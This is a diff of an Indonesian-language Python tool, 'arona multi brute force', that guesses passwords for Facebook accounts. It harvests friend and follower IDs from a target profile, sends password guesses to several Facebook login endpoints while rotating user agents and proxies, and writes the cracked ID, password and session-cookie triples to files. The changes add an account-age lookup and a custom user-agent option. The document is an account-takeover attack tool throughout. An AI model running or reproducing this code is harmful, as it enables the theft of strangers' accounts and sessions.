@@ -22,9 +22,9 @@ tgl = datetime.datetime.now().day
 bln = FR[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
-cpz = str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
-okz = str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
-id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez=[],0,[],[],[],0,0,[],[],[],[]
+cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
+okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
+id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD=[],0,[],[],[],0,0,[],[],[],[],0
 pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
 
 for xyzx in range(1000):
@@ -86,18 +86,9 @@ for yzirx in range(10):
 	k=random.randrange(1, 9)
 	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
 	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-def uakdo():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ua_crack.append(ub)
-	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
+
+try:ua_crack=open("useragent.txt","r").read().splitlines()
+except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"]
 
 m_fb = "m.facebook.com"
 url_businness = "https://business.facebook.com"
@@ -171,6 +162,35 @@ elif 17 <= hour < 18:
 else:
   hhl = "selamat malam"
 
+def tahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
+		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
+		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008-2009'
+	elif len(fx)==8:
+		tahunz = '2007-2008'
+	elif len(fx)==7:
+		tahunz = '2006-2007'
+	else:tahunz=''
+	return tahunz
+
 def banner():
 	os.system("clear")
 	print(f"""
@@ -222,7 +242,7 @@ def login():
 	x=f"{P2}halo pengguna script arona multi brute force :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu arona multi brute force.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	print("")
-	x=f"\t\t{P2}[01] login with cookie\n\t\t{P2}[02] report bug script\n\t\t{P2}[{M2}00{P2}] exit "
+	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
 	if cukuf in ["help","Help","HELP"]:
@@ -257,7 +277,7 @@ def login():
 def login_cookie():
 	print("")
 	#testi_ua()
-	x = f"{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
+	x = f"\t\t{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
 	with requests.Session() as xyz:
@@ -269,7 +289,7 @@ def login_cookie():
 			open('token.txt','w').write(token)
 			x=f"{P2}{token}"
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			input(f"{garis} enter untuk ke menu ")
+			#input(f"{garis} enter untuk ke menu ")
 			menu()
 		except requests.exceptions.ConnectionError:
 			x=f"\t\t{P2}koneksi internet bermasalah"
@@ -346,6 +366,8 @@ def menu():
 	HikmatXD = input(f"{garis} pilih : {H}")
 	if HikmatXD in ["1","01"]:
 		cracked_publickey()
+	#elif HikmatXD in ["2","02"]:
+		#crack_email()
 	elif HikmatXD in ["2","02"]:
 		print("")
 		x=f"{P2}fitur ini dalam masa pengembangan!! "
@@ -385,6 +407,7 @@ def menu():
 		print("")
 		jalan(f"{garis} isi yang benar ")
 		menu()
+
 
 def cracked_publickey():
 	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}) ? : {H}")
@@ -528,7 +551,7 @@ def cracked_public():
 			try:id3.append(fak['id']+'|'+fak['name'])
 			except:continue
 		#print(maling_pangsit+" nama target :%s %s"(H,lk))
-		x=f"{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
+		x=f"{P2}nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		settingers()
 	except requests.exceptions.ConnectionError:
@@ -606,6 +629,17 @@ def crack_public_pilihan():
 		proxp()
 	else:
 		proxp()
+	uar = input(f"{garis} ingin memasukan ua tambahan kamu ({H}y{P}/{M}t{P}) ? : {H}")
+	if uar in ["y","Y","ya"]:
+		ua = input(f"{garis} masukan ua : {H}")
+		ugent = open('useragent.txt','w')
+		ugent.write(ua)
+		ugent.close()
+	elif uar in ["t","T","tidak"]:
+		pass
+	else:
+		jalan(f"{garis} isi yang benar ")
+		crack_public_pilihan()
 	tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
 	if tamtttl in ["y","Y","ya"]:
 		tampilkan_ttl.append("ya")
@@ -715,12 +749,12 @@ def passwer():
 		menu()
 		
 def mobile(uiz,pwr):
-	global ok,cp,loop
+	global ok,cp,HikmatXD
 	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H]) 
-	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),loop,H,ok,K,cp)); sys.stdout.flush()
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
@@ -737,7 +771,7 @@ def mobile(uiz,pwr):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
 					cp+=1
 					break
@@ -751,13 +785,13 @@ def mobile(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
 						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
@@ -766,7 +800,7 @@ def mobile(uiz,pwr):
 				if "no" in tampilkan_ttl:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -782,7 +816,7 @@ def mobile(uiz,pwr):
 						x = json.loads(xn.text)
 						ttl = x['birthday']
 						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -790,7 +824,7 @@ def mobile(uiz,pwr):
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -801,15 +835,15 @@ def mobile(uiz,pwr):
 				continue
 		except requests.exceptions.ConnectionError:
 			turu(31)
-	loop+=1
+	HikmatXD+=1
 	
 def mobile_v2(uiz,pwr):
-	global ok,cp,loop
+	global ok,cp,HikmatXD
 	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
@@ -866,7 +900,7 @@ def mobile_v2(uiz,pwr):
 			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
 					cp+=1
 					break
@@ -880,13 +914,13 @@ def mobile_v2(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
 						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
@@ -895,7 +929,7 @@ def mobile_v2(uiz,pwr):
 				if "no" in tampilkan_ttl:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -911,7 +945,7 @@ def mobile_v2(uiz,pwr):
 						x = json.loads(xn.text)
 						ttl = x['birthday']
 						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -919,7 +953,7 @@ def mobile_v2(uiz,pwr):
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -930,15 +964,15 @@ def mobile_v2(uiz,pwr):
 				continue
 		except requests.exceptions.ConnectionError:
 			turu(31)
-	loop+=1
+	HikmatXD+=1
 	
 def mbasic(uiz,pwr):
-	global ok,cp,loop
+	global ok,cp,HikmatXD
 	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
@@ -955,7 +989,7 @@ def mbasic(uiz,pwr):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
 					cp+=1
 					break
@@ -969,13 +1003,13 @@ def mbasic(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
 						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
@@ -984,7 +1018,7 @@ def mbasic(uiz,pwr):
 				if "no" in tampilkan_ttl:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1000,7 +1034,7 @@ def mbasic(uiz,pwr):
 						x = json.loads(xn.text)
 						ttl = x['birthday']
 						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -1008,7 +1042,7 @@ def mbasic(uiz,pwr):
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1019,15 +1053,15 @@ def mbasic(uiz,pwr):
 				continue
 		except requests.exceptions.ConnectionError:
 			turu(31)
-	loop+=1
+	HikmatXD+=1
 	
 def free(uiz,pwr):
-	global ok,cp,loop
+	global ok,cp,HikmatXD
 	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
@@ -1043,7 +1077,7 @@ def free(uiz,pwr):
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
 					cp+=1
 					break
@@ -1057,13 +1091,13 @@ def free(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
 						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
@@ -1072,7 +1106,7 @@ def free(uiz,pwr):
 				if "no" in tampilkan_ttl:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1087,8 +1121,8 @@ def free(uiz,pwr):
